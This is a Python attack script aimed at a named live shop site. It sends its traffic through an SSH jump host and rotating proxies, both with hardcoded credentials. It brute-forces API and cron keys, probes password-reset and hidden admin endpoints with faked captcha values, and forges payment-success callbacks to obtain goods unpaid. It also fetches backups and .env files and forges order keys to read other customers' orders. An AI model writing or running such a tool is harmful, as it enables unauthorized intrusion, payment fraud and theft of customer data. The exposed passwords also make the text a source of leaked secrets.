#!/usr/bin/env python3
"""qq1.lol deep5-fast — parallel quick probes via jump+QG"""
import hashlib
import json
import os
import re
import shlex
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/workspace/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "deep5.log"
HITS = OUT / "deep5_hits.jsonl"

QG_KEY = os.environ.get("QG_AUTHKEY", "C413ED6D")
QG_PWD = os.environ.get("QG_AUTHPWD", "344F550A6F8B")
JP_PASS = os.environ.get("JP_PASS", "DX4LmrDaPfd9")
JP_HOST = os.environ.get("JP_HOST", "42.240.167.114")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"

API_KEYS = [
    "qq1", "buyi", "buyiq", "qqkqq", "qq1.lol", "buyi123", "buyi888", "830603", "QQKZC",
    "faka", "epay", "syskey", "mckuai", "rainbow", "kln166", "ka1.one", "123456", "admin",
    "888888", "merchant", "apikey", "Lxsj@123", "ruoyi123", "jiankong", "布衣",
]
CRON_KEYS = ["qq1", "buyi", "buyiq", "cron", "jiankong", "123456", "faka", "epay", "888888"]
_lock = __import__("threading").Lock()
_px = None


def log(msg):
    with _lock:
        line = f"[{datetime.now():%H:%M:%S}] {msg}"
        print(line, flush=True)
        with open(LOG, "a") as f:
            f.write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"kind": kind, "detail": detail, "body": (body or "")[:8000]}
    with _lock:
        with open(HITS, "a") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:250]}")


def ssh(script, t=35):
    return subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP_HOST}", script],
        capture_output=True, text=True, timeout=t,
    ).stdout or ""


def proxy():
    global _px
    if _px:
        return _px
    d = json.loads(ssh("curl -s 'https://share.proxy.qg.net/get?key=%s&num=1'" % QG_KEY, 20))
    srv = d["data"][0]["server"]
    _px = f"http://{QG_KEY}:{QG_PWD}@{srv}"
    log(f"proxy {srv}")
    return _px


def curl(url, post=None, jar="/tmp/q5.jar", mt=18):
    px = proxy()
    hdr = "-H 'Referer: https://qq1.lol/' -H 'X-Requested-With: XMLHttpRequest'"
    pp = ""
    if post is not None:
        pp = f"-X POST -H 'Content-Type: application/x-www-form-urlencoded' -d {shlex.quote(post)}"
    s = (
        f"curl -sk --max-time {mt} -x {shlex.quote(px)} -b {jar} -c {jar} -A {shlex.quote(UA)} "
        f"{hdr} {pp} -w '\\n__HTTP:%{{http_code}}' {shlex.quote(url)}"
    )
    out = ssh(s, mt + 15)
    if "__HTTP:" not in out:
        return "", "000"
    body, code = out.rsplit("__HTTP:", 1)
    return body.strip(), code.strip()


def session():
    ssh("rm -f /tmp/q5.jar")
    curl(f"{BASE}/")
    buy, _ = curl(f"{BASE}/?mod=buy&cid=14&tid=131")
    csrf = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy)
    csrf = csrf.group(1) if csrf else ""
    hs = ""
    m = re.search(r"var hashsalt=(.+);", buy)
    if m:
        hs = subprocess.run(
            ["node", "-e", f"var hashsalt={m.group(1)}; console.log(hashsalt)"],
            capture_output=True, text=True, timeout=8,
        ).stdout.strip()
    return csrf, hs


def sect_api():
    log("[1] API keys")
    for key in API_KEYS:
        body, code = curl(f"{BASE}/%61pi.php?act=search&id=25950&key={quote(key)}")
        if body and "请提供" not in body and ('"code":0' in body or "kminfo" in body):
            hit("api_key", key, body)
            return


def sect_cron():
    log("[2] cron keys")
    for k in CRON_KEYS:
        for p in ("key", "auth", "token"):
            body, _ = curl(f"{BASE}/cron.php?{p}={quote(k)}")
            if body and "不正确" not in body and len(body) > 8:
                hit("cron", f"{p}={k}", body)


def sect_auth(csrf):
    log("[3] auth/findpwd/qr")
    for act in ("sendcode", "findpwd", "resetpwd", "verify", "checkuser"):
        body, _ = curl(f"{BASE}/ajax.php?act={act}", f"user=a&qq=123456789&csrf_token={csrf}&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan")
        if body and "No Act" not in body:
            log(f"  {act}: {body[:100]}")
            if '"code":0' in body or "成功" in body:
                hit("auth", act, body)
    qr, _ = curl(f"{BASE}/sup/qrlogin.php?do=getqrpic")
    try:
        qrsig = json.loads(qr).get("qrsig", "")
        if qrsig:
            poll, _ = curl(f"{BASE}/sup/qrlogin.php?do=qrlogin&qrsig={quote(qrsig)}")
            log(f"  qr poll: {poll[:100]}")
    except Exception:
        pass


def sect_hidden(csrf):
    log("[4] hidden acts")
    for act in ("export", "sendcard", "kami", "getorder", "orderlist", "backup", "admin", "payrmb", "rev_api_orders_dump"):
        for ep in ("ajax.php", "sup/ajax.php", "user/ajax.php"):
            body, _ = curl(f"{BASE}/{ep}?act={act}", f"csrf_token={csrf}")
            if body and "No Act" not in body and ('"code":0' in body or "kminfo" in body):
                hit("hidden", f"{ep}?act={act}", body)


def sect_epay(csrf, hs):
    log("[5] epay notify")
    if not hs:
        return
    pay, _ = curl(
        f"{BASE}/ajax.php?act=pay",
        post=(
            f"tid=131&num=1&inputvalue=d5test&csrf_token={csrf}&hashsalt={hs}"
            "&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan"
        ),
    )
    m = re.search(r'"trade_no"\s*:\s*"(\d+)"', pay)
    if not m:
        log(f"  pay fail: {pay[:80]}")
        return
    tn = m.group(1)
    log(f"  order {tn}")
    for key in ("buyi", "qq1", "epay", "123456", "admin"):
        for ep in ("epay_notify.php", "alipay_notify.php", "qqpay_notify.php", "other/epay_notify.php"):
            post = f"out_trade_no={tn}&trade_status=TRADE_SUCCESS&money=99&key={key}"
            body, _ = curl(f"{BASE}/{ep}", post)
            if body and body not in ("error", "fail", "签名失败"):
                log(f"  {ep} key={key}: {body[:80]}")
            shop, _ = curl(f"{BASE}/other/getshop.php?trade_no={tn}")
            if shop and "未付款" not in shop:
                hit("getshop", tn, shop)


def sect_usdt():
    log("[6] USDT submit")
    tn = "20260720222507453"
    for t in ("usdt", "gn_usdt", "gm_usdt", "alipay", "qqpay"):
        body, code = curl(f"{BASE}/other/submit.php?type={t}&orderid={tn}")
        if code == "200" and body and len(body) > 200:
            log(f"  {t} len={len(body)}")
            if any(x in body for x in ("USDT", "usdt", "收款", "address", "TRC")):
                hit("usdt", t, body[:3000])


def sect_backups():
    log("[7] backups")
    paths = ["/backup.zip", "/qq1.sql", "/config.php.bak", "/.env", "/runtime/log/single.log", "/error.log"]
    for p in paths:
        body, code = curl(f"{BASE}{p}")
        if code == "200" and body and len(body) > 100 and "404" not in body[:30]:
            hit("file", p, body[:2000])


def sect_query(csrf, hs):
    log("[8] query/skey")
    for c in ("25950", "buyi", "qqkqq", "deep5test"):
        body, _ = curl(f"{BASE}/ajax.php?act=query&data={quote(c)}")
        if body and "kminfo" in body:
            hit("query", c, body)
    words = API_KEYS[:8] + ([hs] if hs else [])
    for oid in range(25945, 25952):
        for w in words:
            sk = hashlib.md5(f"{oid}{w}{oid}".encode()).hexdigest()
            body, _ = curl(f"{BASE}/ajax.php?act=order", f"id={oid}&skey={sk}")
            if body and "kminfo" in body:
                hit("skey", f"{oid}/{w}", body)
                return


def main():
    log("=== DEEP5 FAST START ===")
    csrf, hs = session()
    log(f"csrf={csrf[:10]} hs={hs[:10]}")

    sections = [
        lambda: sect_api(),
        lambda: sect_cron(),
        lambda: sect_auth(csrf),
        lambda: sect_hidden(csrf),
        lambda: sect_usdt(),
        lambda: sect_backups(),
        lambda: sect_query(csrf, hs),
        lambda: sect_epay(csrf, hs),
    ]
    for fn in sections:
        try:
            fn()
        except Exception as e:
            log(f"section err: {e}")

    n = sum(1 for _ in open(HITS)) if HITS.exists() else 0
    log(f"=== DEEP5 FAST DONE hits={n} ===")


if __name__ == "__main__":
    main()
